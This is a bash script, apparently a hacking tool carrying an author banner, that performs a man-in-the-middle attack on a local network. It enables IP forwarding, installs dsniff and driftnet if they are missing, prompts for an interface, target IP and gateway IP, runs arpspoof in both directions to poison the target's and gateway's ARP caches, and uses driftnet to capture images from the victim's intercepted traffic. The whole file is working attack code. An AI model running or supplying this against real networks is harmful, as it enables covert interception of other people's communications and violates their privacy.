#!/bin/bash

# Enable IP forwarding
echo "[*] Enabling IP forwarding..."
echo 1 > /proc/sys/net/ipv4/ip_forward

# Check if required tools are installed, if not, install them
REQUIRED_TOOLS=("arpspoof" "driftnet")

echo "[*] Checking and installing required tools..."
for tool in "${REQUIRED_TOOLS[@]}"; do
    if ! command -v "$tool" &> /dev/null; then
        echo "[+] Installing $tool..."
        if command -v apt &> /dev/null; then
            sudo apt update && sudo apt install -y dsniff driftnet
        elif command -v pacman &> /dev/null; then
            sudo pacman -Sy dsniff driftnet
        elif command -v yum &> /dev/null; then
            sudo yum install -y dsniff driftnet
        else
            echo "[!] Package manager not supported. Please install $tool manually."
            exit 1
        fi
        break
    fi
done

# Welcome Banner
clear
echo -e "\033[1;34m
-------------------------------------------------------
|                    WELCOME                      m  |
|                   ONII CHAN                        |
|    @uth0r Astra.X    Modified by B!n@ry N!5h@n     |
|                                                    |
-------------------------------------------------------
\033[0m"

# Get user input
read -rp "[+] Please Enter Interface Name: " Interface
read -rp "[+] Please Enter Target IP Address: " Target
read -rp "[+] Please Enter Gateway IP Address: " Gateway

# Execute ARP spoofing
echo -e "\n[+] Launching ARP spoofing attacks and Driftnet sniffing...\n"

# Launching arpspoof for Target -> Gateway and Gateway -> Target
arpspoof -i "$Interface" -t "$Target" "$Gateway" &
arpspoof -i "$Interface" -t "$Gateway" "$Target" &

# Start the driftnet to capture images
driftnet -i "$Interface"
